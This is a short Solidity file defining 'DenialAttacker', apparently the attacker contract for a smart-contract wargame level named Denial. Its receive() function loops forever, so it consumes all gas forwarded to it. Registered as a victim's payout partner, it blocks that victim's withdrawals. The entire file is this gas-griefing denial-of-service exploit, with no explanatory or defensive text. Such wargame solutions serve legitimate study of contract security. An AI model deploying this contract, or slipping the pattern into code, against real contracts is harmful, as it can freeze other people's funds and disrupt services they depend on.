// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Denial.sol";
import "hardhat/console.sol";

contract DenialAttacker {
    receive() external payable {
        while (true) {}
    }
}
